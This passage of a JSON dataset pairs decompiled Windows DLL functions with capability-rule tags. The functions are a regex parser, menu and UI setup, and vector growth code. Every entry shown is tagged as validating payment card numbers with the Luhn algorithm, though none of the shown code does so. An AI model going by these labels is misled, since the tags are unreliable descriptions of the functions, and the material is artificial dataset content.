 if (*(arg1 + 0xf) != 'b') goto code_r0x000180032a2f;\n            iVar5 = 8;\n        }\n    }\n    else {\n        cVar2 = *(arg1 + 0xf);\n        if (cVar2 == 'f') {\n            iVar5 = 0xc;\n        }\n        else if (cVar2 == 'n') {\n            iVar5 = 10;\n        }\n        else if (cVar2 == 'r') {\n            iVar5 = 0xd;\n        }\n        else if (cVar2 == 't') {\n            iVar5 = 9;\n        }\n        else {\n            if (cVar2 != 'v') goto code_r0x000180032a09;\n            iVar5 = 0xb;\n        }\n    }\n    *(arg1 + 0x74) = iVar5;\n    pcVar9 = *arg1;\n    if (pcVar9 != arg1[2]) {\n        if (((*pcVar9 == '\\\\') && (pcVar1 = pcVar9 + 1,  pcVar1 != arg1[2])) &&\n           ((((*(arg1 + 0x10) & 8) == 0 && (*pcVar1 - 0x28U < 2)) ||\n            (((*(arg1 + 0x10) & 0x10) == 0 && ((*pcVar1 + 0x85U & 0xfd) == 0)))))) {\n            pcVar9 = pcVar1;\n        }\n        *arg1 = pcVar9 + 1;\n    }\n    fcn.180030080(arg1);\ncode_r0x000180032b81:\n    if (0xff < *(arg1 + 0x74)) {\n        fcn.180015140(ppcVar8, 2);\n        pcVar3 = swi(3);\n        uVar7 = (*pcVar3)();\n        return uVar7;\n    }\n    *(arg1 + 0x74) = *(arg1 + 0x74);\n    return 1;\n}\n",
        "token_count": 2534
    },
    "180034b5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.180034b50(char **arg1, ulong arg2)\n\n{\n    char *pcVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    char cVar4;\n    int16_t iVar5;\n    int32_t iVar6;\n    char *pcVar7;\n    uint64_t noname_0;\n    char *pcVar8;\n    char **noname_0_00;\n    uint32_t uVar9;\n    int64_t iVar10;\n    bool bVar11;\n    \n    iVar10 = 0;\n    if (arg2 == 0x3a) {\n        uVar9 = 1;\n    }\n    else {\n        uVar9 = 0;\n        if ((arg2 != 0x3d) && (uVar9 = 0xe,  arg2 == 0x2e)) {\n            uVar9 = 0;\n        }\n    }\n    pcVar7 = *arg1;\n    uVar2 = *(arg1 + 0x7c);\n    while ((((uVar2 != 0x3a && (uVar2 != 0x3d)) && (uVar2 != 0x2e)) && (uVar2 != 0xffffffff))) {\n        pcVar8 = *arg1;\n        if (pcVar8 != arg1[2]) {\n            if (((*pcVar8 == '\\\\') && (pcVar1 = pcVar8 + 1,  pcVar1 != arg1[2])) &&\n               ((((*(arg1 + 0x10) & 8) == 0 && (*pcVar1 - 0x28U < 2)) ||\n                (((*(arg1 + 0x10) & 0x10) == 0 && ((*pcVar1 + 0x85U & 0xfd) == 0)))))) {\n                pcVar8 = pcVar1;\n            }\n            *arg1 = pcVar8 + 1;\n        }\n        fcn.180030080(arg1);\n        iVar10 = iVar10 + 1;\n        uVar2 = *(arg1 + 0x7c);\n    }\n    noname_0 = uVar2;\n    if (uVar2 != arg2) {\n        fcn.180015140(noname_0, uVar9);\n        pcVar3 = swi(3);\n        (*pcVar3)();\n        return;\n    }\n    if (arg2 == 0x3a) {\n        pcVar8 = arg1[0xd];\n        iVar5 = fcn.1800349a0(pcVar8, pcVar7, *arg1);\n        if (iVar5 == 0) {\n            fcn.180015140(pcVar8, 1);\n            pcVar3 = swi(3);\n            (*pcVar3)();\n            return;\n        }\n        fcn.180033ff0(arg1 + 8);\n    }\n    else if (arg2 == 0x3d) {\n        if (pcVar7 == *arg1) {\n            fcn.180015140(noname_0, 0);\n            pcVar3 = swi(3);\n            (*pcVar3)();\n            return;\n        }\n        fcn.180035130(arg1 + 8, pcVar7, *arg1);\n    }\n    else if (arg2 == 0x2e) {\n        if (pcVar7 == *arg1) {\n            fcn.180015140(noname_0, 0);\n            pcVar3 = swi(3);\n            (*pcVar3)();\n            return;\n        }\n        fcn.1800352d0(noname_0, pcVar7, *arg1, iVar10);\n    }\n    pcVar7 = *arg1;\n    if (pcVar7 != arg1[2]) {\n        if (((*pcVar7 == '\\\\') && (pcVar8 = pcVar7 + 1,  pcVar8 != arg1[2])) &&\n           ((((*(arg1 + 0x10) & 8) == 0 && (*pcVar8 - 0x28U < 2)) ||\n            (((*(arg1 + 0x10) & 0x10) == 0 && ((*pcVar8 + 0x85U & 0xfd) == 0)))))) {\n            pcVar7 = pcVar8;\n        }\n        *arg1 = pcVar7 + 1;\n    }\n    noname_0_00 = arg1;\n    fcn.180030080(arg1);\n    if (*(arg1 + 0x7c) != 0x5d) {\n        fcn.180015140(noname_0_00, uVar9);\n        pcVar3 = swi(3);\n        (*pcVar3)();\n        return;\n    }\n    pcVar7 = *arg1;\n    if (pcVar7 != arg1[2]) {\n        if (((*pcVar7 == '\\\\') && (pcVar8 = pcVar7 + 1,  pcVar8 != arg1[2])) &&\n           ((((*(arg1 + 0x10) & 8) == 0 && (*pcVar8 - 0x28U < 2)) ||\n            (((*(arg1 + 0x10) & 0x10) == 0 && ((*pcVar8 + 0x85U & 0xfd) == 0)))))) {\n            pcVar7 = pcVar8;\n        }\n        *arg1 = pcVar7 + 1;\n    }\n    if (*arg1 == arg1[2]) {\n        *(arg1 + 0xf) = 0xff;\n        iVar6 = -1;\n    }\n    else {\n        cVar4 = **arg1;\n        *(arg1 + 0xf) = cVar4;\n        iVar10 = fcn.1800add0c(\"()$^.*+?[]|\\\\-{},:=!\\n\\r\\b\", cVar4);\n        if (iVar10 == 0) {\n            iVar6 = 0;\n        }\n        else {\n            iVar6 = *(arg1 + 0xf);\n        }\n    }\n    *(arg1 + 0x7c) = iVar6;\n    if (0x73 < *(arg1 + 0xf) - 10U) {\n        return;\n    }\n    switch(*(*((*(arg1 + 0xf) - 10U) + 0x1800302a4) * 4 + 0x18003027c) + 0x180000000) {\n    case 0x1800300f2:\n        pcVar7 = *arg1 + 1;\n        if (pcVar7 == arg1[2]) {\n            return;\n        }\n        if (((*(arg1 + 0x10) & 8) != 0) || ((cVar4 = *pcVar7,  cVar4 != '(' && (cVar4 != ')')))) {\n            if ((*(arg1 + 0x10) & 0x10) != 0) {\n                return;\n            }\n            cVar4 = *pcVar7;\n            if ((cVar4 != '{') && (cVar4 != '}')) {\n                return;\n            }\n        }\n        *(arg1 + 0xf) = cVar4;\n        *(arg1 + 0x7c) = cVar4;\n        return;\n    case 0x180030151:\n        if ((*(arg1 + 0x10) & 4) == 0) {\n            return;\n        }\n        if (*(arg1 + 0x1c) != 0) {\n            return;\n        }\n        *(arg1 + 0x7c) = 0x7c;\n        return;\n    case 0x180030179:\n        bVar11 = (*(arg1 + 0x10) & 8) == 0;\n        break;\n    case 0x180030185:\n        bVar11 = (*(arg1 + 0x10) & 0x10) == 0;\n        break;\n    case 0x180030191:\n        if ((*(arg1 + 0x10) & 0x4000000) == 0) {\n            return;\n        }\n        uVar9 = *(arg1[9] + 8);\n        if ((0x14 < uVar9) || ((0x102100U >> (uVar9 & 0x1f) & 1) == 0)) {\n            if (uVar9 != 2) {\n                return;\n            }\n            uVar9 = *(*(arg1[9] + 0x18) + 8);\n            if (0x14 < uVar9) {\n                return;\n            }\n            if ((0x102100U >> (uVar9 & 0x1f) & 1) == 0) {\n                return;\n            }\n            *(arg1 + 0x7c) = 0;\n            return;\n        }\n        goto code_r0x00018003026e;\n    case 0x1800301eb:\n        if ((*(arg1 + 0x10) & 0x2000000) == 0) {\n            return;\n        }\n        uVar9 = *(arg1[9] + 8);\n        if ((uVar9 < 0x15) && ((0x102100U >> (uVar9 & 0x1f) & 1) != 0)) {\n            return;\n        }\n        if ((uVar9 == 2) && (uVar9 = *(*(arg1[9] + 0x18) + 8),  uVar9 < 0x15)) {\n            if ((0x102100U >> (uVar9 & 0x1f) & 1) != 0) {\n                return;\n            }\n            *(arg1 + 0x7c) = 0;\n            return;\n        }\n        goto code_r0x00018003026e;\n    case 0x180030231:\n        if ((*(arg1 + 0x10) & 0x2000000) == 0) {\n            return;\n        }\n        if (*arg1 + 1 == arg1[2]) {\n            return;\n        }\n        if ((*arg1)[1] == '\\n') {\n            return;\n        }\n        *(arg1 + 0x7c) = 0;\n        return;\n    case 0x18003025c:\n        bVar11 = (*(arg1 + 0x10) & 1) == 0;\n        break;\n    case 0x180030265:\n        bVar11 = (*(arg1 + 0x10) & 2) == 0;\n        break;\n    case 0x180030271:\n        goto code_r0x000180030271;\n    }\n    if (bVar11) {\ncode_r0x00018003026e:\n        *(arg1 + 0x7c) = 0;\n    }\ncode_r0x000180030271:\n    return;\n}\n",
        "token_count": 2415
    },
    "1800358e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.1800358e0(void)\n\n{\n    char cVar1;\n    ulong uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int32_t iVar5;\n    uint64_t uVar6;\n    \n    uVar2 = *0x18012a388;\n    cVar1 = (**(*0x1801240b0 + 0x68))(0x1801240b0);\n    if (cVar1 == '\\0') {\n        *0x1801240c0 = *0x18012a390;\n        *0x1801240b8 = uVar2;\n        (**(*0x1801240b0 + 0x60))(0x1801240b0, 0x251c);\n    }\n    *0x180124150 = (**0x1800de798)(*0x1801240c8, 0x2529);\n    *0x180124158 = (**0x1800de798)(*0x1801240c8, 0x25c0);\n    *0x180124160 = (**0x1800de798)(*0x1801240c8, 0x25c2);\n    (**0x1800de7f0)(*0x180124160, 0xc5);\n    (**0x1800de010)(*0x180124160, 0x180035660, 0, 0);\n    iVar5 = 0x2581;\n    iVar4 = 10;\n    do {\n        uVar2 = (**0x1800de798)(*0x1801240c8, iVar5 + -0x3c);\n        (**0x1800de010)(uVar2, 0x180035590, 0, 0);\n        (**0x1800de730)(*0x1801240c8, iVar5 + -0x3c, 0xc5, 0x104, 0);\n        uVar2 = (**0x1800de798)(*0x1801240c8, iVar5);\n        (**0x1800de010)(uVar2, 0x180035590, 0, 0);\n        uVar6 = 0;\n        (**0x1800de730)(*0x1801240c8, iVar5, 0xc5, 0x104, 0);\n        uVar2 = (**0x1800de798)(*0x1801240c8, iVar5 + 0x14);\n        iVar3 = (**0x1800de638)(*0x18012a388);\n        if (iVar3 != 0) {\n            (**0x1800de7f0)(uVar2, 0xf7, 0, iVar3);\n            (**0x1800de0a8)(iVar3);\n        }\n        uVar6 = uVar6 & 0xffffffffffffff00;\n        fcn.180067d90(*0x1801240c8, iVar5 + 0x14, 0, L\"Insert Line Item\\t[CTRL+Insert]\");\n        uVar2 = (**0x1800de798)(*0x1801240c8, iVar5 + 0x28);\n        iVar3 = (**0x1800de638)(*0x18012a388);\n        if (iVar3 != 0) {\n            (**0x1800de7f0)(uVar2, 0xf7, 0, iVar3, uVar6);\n            (**0x1800de0a8)(iVar3);\n        }\n        uVar6 = uVar6 & 0xffffffffffffff00;\n        fcn.180067d90(*0x1801240c8, iVar5 + 0x28, 0, L\"Delete Line Item\\t[CTRL+Delete]\");\n        iVar5 = iVar5 + 1;\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    uVar2 = (**0x1800de798)(*0x1801240c8, 0x2524);\n    iVar4 = (**0x1800de638)(*0x18012a388, 0x25d5);\n    if (iVar4 != 0) {\n        (**0x1800de7f0)(uVar2, 0xf7, 0, iVar4, uVar6);\n        (**0x1800de0a8)(iVar4);\n    }\n    uVar6 = uVar6 & 0xffffffffffffff00;\n    fcn.180067d90(*0x1801240c8, 0x2524, 0, L\"Previous Page\\t[CTRL+Page Up]\");\n    uVar2 = (**0x1800de798)(*0x1801240c8, 0x2525);\n    iVar4 = (**0x1800de638)(*0x18012a388, 0x25d6);\n    if (iVar4 != 0) {\n        (**0x1800de7f0)(uVar2, 0xf7, 0, iVar4, uVar6);\n        (**0x1800de0a8)(iVar4);\n    }\n    uVar6 = uVar6 & 0xffffffffffffff00;\n    fcn.180067d90(*0x1801240c8, 0x2525, 0, L\"Next Page\\t[CTRL+Page Down]\");\n    uVar2 = (**0x1800de798)(*0x1801240c8, 0x2522);\n    iVar4 = (**0x1800de638)(*0x18012a388, 0x25d3);\n    if (iVar4 != 0) {\n        (**0x1800de7f0)(uVar2, 0xf7, 0, iVar4, uVar6);\n        (**0x1800de0a8)(iVar4);\n    }\n    uVar6 = uVar6 & 0xffffffffffffff00;\n    fcn.180067d90(*0x1801240c8, 0x2522, 0, L\"Add Page\\t[CTRL+SHIFT+Insert]\");\n    uVar2 = (**0x1800de798)(*0x1801240c8, 0x2523);\n    iVar4 = (**0x1800de638)(*0x18012a388, 0x25d4);\n    if (iVar4 != 0) {\n        (**0x1800de7f0)(uVar2, 0xf7, 0, iVar4, uVar6);\n        (**0x1800de0a8)(iVar4);\n    }\n    uVar6 = uVar6 & 0xffffffffffffff00;\n    fcn.180067d90(*0x1801240c8, 0x2523, 0, L\"Delete Page\\t[CTRL+SHIFT+Delete]\");\n    uVar2 = (**0x1800de798)(*0x1801240c8, 0x2526);\n    iVar4 = (**0x1800de638)(*0x18012a388, 0x2336);\n    if (iVar4 != 0) {\n        (**0x1800de7f0)(uVar2, 0xf7, 0, iVar4, uVar6);\n        (**0x1800de0a8)(iVar4);\n    }\n    uVar6 = uVar6 & 0xffffffffffffff00;\n    fcn.180067d90(*0x1801240c8, 0x2526, 0, L\"Move down the selected Line Item\\t[CTRL+Down Arrow]\");\n    uVar2 = (**0x1800de798)(*0x1801240c8, 0x2527);\n    iVar4 = (**0x1800de638)(*0x18012a388, 0x2337);\n    if (iVar4 != 0) {\n        (**0x1800de7f0)(uVar2, 0xf7, 0, iVar4, uVar6);\n        (**0x1800de0a8)(iVar4);\n    }\n    uVar6 = uVar6 & 0xffffffffffffff00;\n    fcn.180067d90(*0x1801240c8, 0x2527, 0, L\"Move up the selected Line Item\\t[CTRL+Up Arrow]\");\n    (**0x1800de758)(*0x1801240c8, 0x25be);\n    uVar2 = (**0x1800de798)(*0x1801240c8, 0x251d);\n    iVar4 = (**0x1800de638)(*0x18012a388, 0x2335);\n    if (iVar4 != 0) {\n        (**0x1800de7f0)(uVar2, 0xf7, 0, iVar4);\n        (**0x1800de0a8)(iVar4);\n    }\n    uVar6 = uVar6 & 0xffffffffffffff00;\n    fcn.180067d90(*0x1801240c8, 0x251d, 0, 0x1800f6ec8);\n    fcn.180066d20(0x1801240b0);\n    (**0x1800de7f0)(*0x1801240c0, 0x806, 0, *0x1801240c8, uVar6);\n    // WARNING: Could not recover jumptable at 0x000180035e87. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x1800de6f0)(*0x1801240c8);\n    return;\n}\n",
        "token_count": 2128
    },
    "18003cb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.18003cb00(void)\n\n{\n    char cVar1;\n    ulong uVar2;\n    int64_t iVar3;\n    \n    uVar2 = *0x18012a388;\n    cVar1 = (**(*0x180123ea0 + 0x68))(0x180123ea0);\n    if (cVar1 == '\\0') {\n        *0x180123eb0 = *0x18012a390;\n        *0x180123ea8 = uVar2;\n        (**(*0x180123ea0 + 0x60))(0x180123ea0, 0x24b8, 0, 1);\n    }\n    fcn.180066d20(0x180123ea0);\n    uVar2 = (**0x1800de798)(*0x180123eb8, 0x24be);\n    iVar3 = (**0x1800de638)(*0x18012a388, 0x2335);\n    if (iVar3 != 0) {\n        (**0x1800de7f0)(uVar2, 0xf7, 0, iVar3);\n        (**0x1800de0a8)(iVar3);\n    }\n    fcn.180067d90(*0x180123eb8, 0x24be, 0, 0x1800f75b8);\n    // WARNING: Could not recover jumptable at 0x00018003cbef. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x1800de7f0)(*0x180123eb0, 0x806, 0, *0x180123eb8);\n    return;\n}\n",
        "token_count": 376
    },
    "1800490a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nint64_t fcn.1800490a0(int64_t *arg1, int64_t arg2, ulong arg3)\n\n{\n    uint64_t arg3_00;\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    uint64_t arg4;\n    \n    iVar3 = *arg1;\n    iVar6 = (arg2 - iVar3) / 6 + (arg2 - iVar3 >> 0x3f);\n    iVar5 = (arg1[1] - iVar3) / 0x60;\n    if (iVar5 == 0x2aaaaaaaaaaaaaa) {\n        fcn.180014900();\n        pcVar1 = swi(3);\n        iVar3 = (*pcVar1)();\n        return iVar3;\n    }\n    arg3_00 = iVar5 + 1;\n    uVar2 = (arg1[2] - iVar3) / 0x60;\n    arg4 = arg3_00;\n    if ((uVar2 <= 0x2aaaaaaaaaaaaaa - (uVar2 >> 1)) && (arg4 = (uVar2 >> 1) + uVar2,  arg4 < arg3_00)) {\n        arg4 = arg3_00;\n    }\n    uVar2 = arg4 * 0x60;\n    if (arg4 < 0x2aaaaaaaaaaaaab) {\n        if (uVar2 < 0x1000) {\n            if (uVar2 == 0) {\n                uVar2 = 0;\n            }\n            else {\n                uVar2 = fcn.18008fb2c(uVar2);\n            }\n            goto code_r0x0001800491d6;\n        }\n    }\n    else {\n        uVar2 = 0xffffffffffffffff;\n    }\n    uVar4 = uVar2 + 0x27;\n    if (uVar4 <= uVar2) {\n        uVar4 = 0xffffffffffffffff;\n    }\n    iVar3 = fcn.18008fb2c(uVar4);\n    if (iVar3 == 0) {\n        fcn.1800b3528();\n        pcVar1 = swi(3);\n        iVar3 = (*pcVar1)();\n        return iVar3;\n    }\n    uVar2 = iVar3 + 0x27U & 0xffffffffffffffe0;\n    *(uVar2 - 8) = iVar3;\ncode_r0x0001800491d6:\n    iVar6 = ((iVar6 >> 4) - (iVar6 >> 0x3f)) * 0x60 + uVar2;\n    fcn.1800434a0(iVar6, arg3);\n    iVar3 = arg1[1];\n    iVar5 = *arg1;\n    uVar4 = uVar2;\n    if (arg2 != iVar3) {\n        fcn.18004a0e0(*arg1, arg2, uVar2);\n        iVar3 = arg1[1];\n        iVar5 = arg2;\n        uVar4 = iVar6 + 0x60;\n    }\n    fcn.18004a0e0(iVar5, iVar3, uVar4);\n    fcn.180049650(arg1, uVar2, arg3_00, arg4);\n    return iVar6;\n}\n",
        "token_count": 747
    },
    "18004926": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nint64_t fcn.180049260(int64_t *arg1, int64_t arg2, ulong arg3)\n\n{\n    uint64_t arg3_00;\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t arg3_01;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    uint64_t arg2_00;\n    int64_t arg1_00;\n    \n    iVar3 = *arg1;\n    iVar5 = (arg2 - iVar3) / 6 + (arg2 - iVar3 >> 0x3f);\n    iVar4 = (arg1[1] - iVar3) / 0x60;\n    if (iVar4 == 0x2aaaaaaaaaaaaaa) {\n        fcn.180014900();\n        pcVar1 = swi(3);\n        iVar3 = (*pcVar1)();\n        return iVar3;\n    }\n    arg3_00 = iVar4 + 1;\n    uVar2 = (arg1[2] - iVar3) / 0x60;\n    arg2_00 = arg3_00;\n    if ((uVar2 <= 0x2aaaaaaaaaaaaaa - (uVar2 >> 1)) && (arg2_00 = (uVar2 >> 1) + uVar2,  arg2_00 < arg3_00)) {\n        arg2_00 = arg3_00;\n    }\n    arg3_01 = fcn.180048fa0(arg1[2] - iVar3, arg2_00);\n    arg1_00 = ((iVar5 >> 4) - (iVar5 >> 0x3f)) * 0x60 + arg3_01;\n    fcn.180043fe0(arg1_00, arg3);\n    iVar3 = arg1[1];\n    iVar4 = *arg1;\n    iVar5 = arg3_01;\n    if (arg2 != iVar3) {\n        fcn.18004a1d0(*arg1, arg2, arg3_01);\n        iVar3 = arg1[1];\n        iVar4 = arg2;\n        iVar5 = arg1_00 + 0x60;\n    }\n    fcn.18004a1d0(iVar4, iVar3, iVar5);\n    fcn.1800497c0(arg1, arg3_01, arg3_00, arg2_00);\n    return arg1_00;\n}\n",
        "token_count": 541
    },
    "18004bfb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18004bfb0(void)\n\n{\n    uint *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    char cVar6;\n    ulong uVar7;\n    int64_t iVar8;\n    uint *puVar9;\n    uint *puVar10;\n    uchar *puVar11;\n    uint64_t uVar12;\n    uint *puVar13;\n    int64_t arg2;\n    int64_t arg2_00;\n    uint *puVar14;\n    uchar auStack184 [32];\n    ulong uStack152;\n    uchar *puStack136;\n    uint64_t uStack112;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uchar auStack88 [16];\n    uint *puStack72;\n    ulong uStack64;\n    uint64_t uStack56;\n    \n    uVar7 = *0x18012a388;\n    uStack64 = 0x18004bfd2;\n    cVar6 = (**(*0x1801246b0 + 0x68))(0x1801246b0);\n    if (cVar6 == '\\0') {\n        *0x1801246c0 = *0x18012a390;\n        *0x1801246b8 = uVar7;\n        uStack64 = 0x18004c007;\n        (**(*0x1801246b0 + 0x60))(0x1801246b0, 0x23f0, 0, 1);\n    }\n    uStack64 = 0x18004c01a;\n    fcn.18004b3b0(0x1801246e0, *0x1801246c8);\n    uStack64 = 0x18004c02c;\n    *0x180124768 = (**0x1800de798)(*0x1801246c8, 0x23f2);\n    uStack64 = 0x18004c045;\n    *0x180124770 = (**0x1800de798)(*0x1801246c8, 0x2409);\n    uStack64 = 0x18004c071;\n    (**0x1800de730)(*0x1801246c8, 0x23f6);\n    uStack64 = 0x18004c083;\n    uVar7 = (**0x1800de798)(*0x1801246c8, 0x2409);\n    uStack64 = 0x18004c099;\n    (**0x1800de010)(uVar7, 0x180051d40, 0, 0);\n    uStack64 = 0x18004c0ab;\n    uVar7 = (**0x1800de798)(*0x1801246c8, 0x23f3);\n    uStack64 = 0x18004c0c0;\n    iVar8 = (**0x1800de638)(*0x18012a388, 0x2336);\n    if (iVar8 != 0) {\n        uStack64 = 0x18004c0dc;\n        (**0x1800de7f0)(uVar7, 0xf7, 0, iVar8);\n        uStack64 = 0x18004c0e5;\n        (**0x1800de0a8)(iVar8);\n    }\n    uStack64 = 0x18004c105;\n    fcn.180067d90(*0x1801246c8, 0x23f3, 0, L\"Move down the selected Theme\");\n    uStack64 = 0x18004c117;\n    uVar7 = (**0x1800de798)(*0x1801246c8, 0x23f4);\n    uStack64 = 0x18004c12c;\n    iVar8 = (**0x1800de638)(*0x18012a388, 0x2337);\n    if (iVar8 != 0) {\n        uStack64 = 0x18004c148;\n        (**0x1800de7f0)(uVar7, 0xf7, 0, iVar8);\n        uStack64 = 0x18004c151;\n        (**0x1800de0a8)(iVar8);\n    }\n    uStack64 = 0x18004c171;\n    fcn.180067d90(*0x1801246c8, 0x23f4, 0, L\"Move up the selected Theme\");\n    uStack64 = 0x18004c183;\n    uVar7 = (**0x1800de798)(*0x1801246c8, 0x2407);\n    uStack64 = 0x18004c198;\n    iVar8 = (**0x1800de638)(*0x18012a388, 0x2336);\n    if (iVar8 != 0) {\n        uStack64 = 0x18004c1b4;\n        (**0x1800de7f0)(uVar7, 0xf7, 0, iVar8);\n        uStack64 = 0x18004c1bd;\n        (**0x1800de0a8)(iVar8);\n    }\n    uStack64 = 0x18004c1dd;\n    fcn.180067d90(*0x1801246c8, 0x2407, 0, L\"Move down the selected Style\");\n    uStack64 = 0x18004c1ef;\n    uVar7 = (**0x1800de798)(*0x1801246c8, 0x2408);\n    uStack64 = 0x18004c204;\n    iVar8 = (**0x1800de638)(*0x18012a388, 0x2337);\n    if (iVar8 != 0) {\n        uStack64 = 0x18004c220;\n        (**0x1800de7f0)(uVar7, 0xf7, 0, iVar8);\n        uStack64 = 0x18004c229;\n        (**0x1800de0a8)(iVar8);\n    }\n    uStack64 = 0x18004c249;\n    fcn.180067d90(*0x1801246c8, 0x2408, 0, 0x1800f9de8);\n    uStack64 = 0x18004c25b;\n    uVar7 = (**0x1800de798)(*0x1801246c8, 0x2447);\n    uStack64 = 0x18004c270;\n    iVar8 = (**0x1800de638)(*0x18012a388, 0x2335);\n    if (iVar8 != 0) {\n        uStack64 = 0x18004c28c;\n        (**0x1800de7f0)(uVar7, 0xf7, 0, iVar8);\n        uStack64 = 0x18004c295;\n        (**0x1800de0a8)(iVar8);\n    }\n    uStack64 = 0x18004c2b5;\n    fcn.180067d90(*0x1801246c8, 0x2447, 0, 0x1800f9f00);\n    uStack64 = 0x18004c2c1;\n    fcn.180066d20(0x1801246b0);\n    uStack64 = 0x18004c2dd;\n    (**0x1800de7f0)(*0x1801246c0, 0x806, 0, *0x1801246c8);\n    uStack64 = 0x18004c2ea;\n    (**0x1800de6f0)(*0x1801246c8);\n    uStack64 = 0x18004c2f6;\n    fcn.18004d240(0x1801246b0);\n    uStack152 = 0xfffffffffffffffe;\n    uStack56 = *0x180123080 ^ &stack0xffffffffffffff48;\n    (**0x1800de7f0)(*0x180124768, 0x184, 0, 0);\n    iVar8 = *0x180124780;\n    if (*0x180124778 != *0x180124780) {\n        puVar14 = *0x180124778 + 0x20;\n        arg2 = *0x180124778;\n        do {\n            puVar11 = &stack0xffffffffffffff78;\n            fcn.18000da90(puVar11, arg2);\n            uStack104 = *puVar14;\n            uStack100 = puVar14[1];\n            uStack96 = puVar14[2];\n            uStack92 = puVar14[3];\n            auStack88 = ZEXT816(0);\n            puStack72 = NULL;\n            puVar13 = *(puVar14 + 4);\n            puVar1 = *(puVar14 + 6);\n            if (puVar13 != puVar1) {\n                arg2_00 = puVar1 - puVar13 >> 4;\n                puVar9 = fcn.18001b980(puVar11, arg2_00);\n                puStack72 = puVar9 + arg2_00 * 4;\n                puVar10 = puVar9;\n                do {\n                    uVar3 = puVar13[1];\n                    uVar4 = puVar13[2];\n                    uVar5 = puVar13[3];\n                    *puVar10 = *puVar13;\n                    puVar10[1] = uVar3;\n                    puVar10[2] = uVar4;\n                    puVar10[3] = uVar5;\n                    puVar10 = puVar10 + 4;\n                    puVar13 = puVar13 + 4;\n                } while (puVar13 != puVar1);\n                auStack88 = CONCAT88(puVar10, puVar9);\n            }\n            puVar11 = &stack0xffffffffffffff78;\n            if (7 < uStack112) {\n                puVar11 = puStack136;\n            }\n            (**0x1800de7f0)(*0x180124768, 0x180, 0, puVar11);\n            if (auStack88._0_8_ != NULL) {\n                uVar12 = puStack72 - auStack88._0_8_ & 0xfffffffffffffff0;\n                puVar11 = auStack88._0_8_;\n                if ((0xfff < uVar12) && (puVar11 = *(auStack88._0_8_ + -8),  0x1f < auStack88._0_8_ + (-8 - puVar11)))\n                goto code_r0x00018004daa5;\n                fcn.18008fb24(puVar11);\n                auStack88 = ZEXT816(0);\n                puStack72 = NULL;\n            }\n            if (7 < uStack112) {\n                uVar12 = uStack112 * 2 + 2;\n                puVar11 = puStack136;\n                if ((0xfff < uVar12) && (puVar11 = *(puStack136 + -8),  0x1f < puStack136 + (-8 - puVar11))) {\ncode_r0x00018004daa5:\n                    fcn.1800b3528(puVar11, uVar12 + 0x27);\n                    pcVar2 = swi(3);\n                    (*pcVar2)();\n                    return;\n                }\n                fcn.18008fb24(puVar11);\n            }\n            arg2 = arg2 + 0x48;\n            puVar14 = puVar14 + 0x12;\n        } while (arg2 != iVar8);\n    }\n    iVar8 = *0x180124780 - *0x180124778 >> 0x3f;\n    if ((*0x180124780 - *0x180124778) / 0x48 + iVar8 != iVar8) {\n        (**0x1800de7f0)(*0x180124768, 0x186, 0, 0);\n    }\n    *0x180124765 = 0x101;\n    fcn.18004f110(0x1801246b0);\n    fcn.18008fb00(uStack56 ^ &stack0xffffffffffffff48);\n    return;\n}\n",
        "token_count": 2777
    },
    "18004dab": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
